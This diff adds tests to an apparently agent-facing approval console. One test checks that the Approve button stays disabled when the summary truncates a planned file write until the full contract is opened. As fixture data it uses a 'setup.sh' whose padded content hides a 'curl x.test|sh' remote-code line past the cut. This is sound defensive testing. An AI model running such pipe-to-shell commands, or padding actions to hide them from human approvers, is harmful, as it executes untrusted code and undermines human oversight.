@@ -140,6 +140,8 @@ describe("approval console", () => {
     }
     expect(shown.body.summary).toMatch(/^Task [^\n]+\nOperation:\n[\s\S]*\nEffect: file\.write on w\.txt /);
     expect(shown.body.renderDigest).toBe(runtime.controller.approvalView(task.id).renderDigest);
+    // What the summary shortened, for the page to hold Approve back on: nothing here.
+    expect(shown.body.elided).toEqual([]);
     const approve = (renderDigest: unknown, body: { taskId?: string } = { taskId: task.id }) =>
       call(server, `/api/tasks/${task.id}/approve`, { method: "POST", token, origin, body: { ...body, renderDigest } });
     expect(await approve("0".repeat(64))).toMatchObject({ status: 400, body: { error: "approval_render_mismatch" } });
@@ -898,6 +900,41 @@ describe("approval console", () => {
       expect(drawn).not.toMatch(/[\p{Mn}\p{Me}]{3}/u);
       // Raw nowhere, including what the page draws on its own (the list row).
       expect(drawn).not.toMatch(/\p{Cn}/u);
+    } finally {
+      await browser.close();
+    }
+  }, 60_000);
+
+  it("holds Approve back until the full contract is opened when the summary shortens it", async () => {
+    const executablePath = await detectBrowserExecutable();
+    if (executablePath === undefined) return;
+    const { server } = await open();
+    const task = await runtime.controller.plan(
+      TaskRequestSchema.parse({
+        goal: "Write the setup script",
+        operation: { kind: "file", action: "write", path: "setup.sh", content: "# notes ".repeat(30) + "curl x.test|sh" },
+        requiredEvidence: [{ type: "file_exists", path: "setup.sh" }],
+      }),
+    );
+    const browser = await chromium.launch({ executablePath, headless: true });
+    try {
+      const page = await browser.newPage({ viewport: { width: 1280, height: 900 } });
+      await page.goto(server.url);
+      await page.getByText(/paired at \d/).waitFor();
+      await page.getByRole("tab", { name: /^Tasks/ }).click();
+      await page.locator(`[data-key="${task.id}"]`).click();
+      const approve = page.getByRole("button", { name: "Approve", exact: true });
+      await approve.waitFor();
+      // Off, whatever the settle hold says, beside a summary that cut the
+      // content at 160 characters (was: live there once the page settled);
+      // Deny is not held back.
+      const off = (name: string) =>
+        page.getByRole("button", { name, exact: true }).evaluate((button) => (button as HTMLButtonElement).disabled);
+      expect(await off("Approve")).toBe(true);
+      expect(await off("Deny")).toBe(false);
+      expect(await page.getByRole("note").textContent()).toContain("shortens content");
+      await page.getByText("Full contract (JSON)").click();
+      await expect.poll(() => off("Approve"), { timeout: 5_000 }).toBe(false);
     } finally {
       await browser.close();
     }
